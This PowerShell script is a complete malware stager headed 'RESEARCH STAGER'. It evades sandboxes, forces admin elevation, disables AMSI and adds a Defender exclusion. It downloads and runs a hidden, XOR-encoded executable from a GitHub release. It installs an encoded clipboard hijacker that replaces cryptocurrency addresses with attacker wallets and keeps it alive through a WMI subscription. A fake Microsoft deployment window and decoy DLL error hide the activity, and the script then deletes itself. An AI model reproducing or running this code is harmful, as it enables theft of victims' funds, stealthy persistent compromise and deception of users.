# --- [RESEARCH STAGER v90.0: ENTERPRISE ELITE FINAL] ---
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. GATEKEEPER: ANTI-VM / ANTI-SANDBOX (v65.0 Logic)
$mem = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
if ($mem -lt 4) { exit } 

# 2. JUNK CODE BLOATING
$garbage_array = @()
for($i=0; $i -lt 300; $i++){ $garbage_array += [Guid]::NewGuid().ToString() }

# 3. Admin Gate (v34.0 Style - LOCKED LOGIC)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
    exit
}

function Global-Initialize {
    try {
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
    } catch { }
}

# 4. THE VISUAL SYNC ENGINE
function Run-Deployment {
    # Define the UI Form
    $form = New-Object Windows.Forms.Form
    $form.Text = "Microsoft System Deployment Assistant"; $form.Size = New-Object Drawing.Size(480,220)
    $form.StartPosition = "CenterScreen"; $form.FormBorderStyle = "FixedSingle"; $form.TopMost = $true; $form.BackColor = [Drawing.Color]::White

    $status = New-Object Windows.Forms.Label
    $status.Location = New-Object Drawing.Point(30,30); $status.Size = New-Object Drawing.Size(400,30)
    $status.Text = "Initializing secure environment..."; $status.Font = New-Object Drawing.Font("Segoe UI", 9)
    $form.Controls.Add($status)

    $pb = New-Object Windows.Forms.ProgressBar
    $pb.Location = New-Object Drawing.Point(30,75); $pb.Size = New-Object Drawing.Size(400,20)
    $pb.Style = "Continuous"; $form.Controls.Add($pb)

    $form.Show()
    [Windows.Forms.Application]::DoEvents()

    try {
        # STEP 1: Directory & Defender Prep (20%)
        $status.Text = "Configuring system directories..."; $pb.Value = 20
        $dir = "$env:PROGRAMDATA\Microsoft\Windows\Templates\Sync"
        if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
        Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
        [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 800

        # STEP 2: XOR Engine & Payload (50%)
        $status.Text = "Downloading system components..."; $pb.Value = 50
        $path = Join-Path $dir "WinSvcHost.exe"
        $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
        $data = [Convert]::FromBase64String($raw.Trim())
        for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
        [IO.File]::WriteAllBytes($path, $data)
        Start-Process $path -WindowStyle Hidden
        [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 800

        # STEP 3: Clipper & WMI Watchdog (80%)
        $status.Text = "Finalizing security handshake..."; $pb.Value = 80
        $L1 = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"};'
        $L2 = 'while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim();'
        $L3 = 'if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ if($v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } }'
        $L4 = 'elseif($v -match "^0x[a-fA-F0-9]{40}$"){ if($v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } }'
        $L5 = 'elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ if($v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } }'
        $L6 = 'elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ if($v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } } }catch{} Start-Sleep -m 500 }'
        $FinalC = $L1 + $L2 + $L3 + $L4 + $L5 + $L6
        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FinalC))
        
        # Launch Clipper in RAM
        Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
        
        # Set WMI Watchdog (v87.5 Logic)
        $Q = "SELECT * FROM __InstanceDeletionEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'powershell.exe'"
        $Cmd = "powershell.exe -NoP -W Hidden -EP Bypass -Enc $enc"
        Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{Name='MevFilter'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=$Q} | Out-Null
        Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{Name='MevConsumer'; CommandLineTemplate=$Cmd} | Out-Null
        Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=(Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -Filter "Name='MevFilter'"); Consumer=(Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer -Filter "Name='MevConsumer'")} | Out-Null
        
        [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 800

        # STEP 4: Completion (100%)
        $status.Text = "Deployment did not complete."; $pb.Value = 100
        [Windows.Forms.Application]::DoEvents(); Start-Sleep -s 1
        $form.Close()

        # 5. FAKE DLL ERROR (The Decoy)
        $msg = "The program can't start because msvcr120_clr0400.dll is missing from your computer. Try reinstalling the program to fix this problem."
        [Windows.Forms.MessageBox]::Show($msg, "System Error", 0, 16) | Out-Null

        # SELF-DESTRUCT
        Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue

    } catch { 
        $form.Close()
        [Windows.Forms.MessageBox]::Show("Critical System Error (0x80070422)", "System Error", 0, 16) | Out-Null
    }
}

# --- EXECUTE ---
Global-Initialize
Run-Deployment
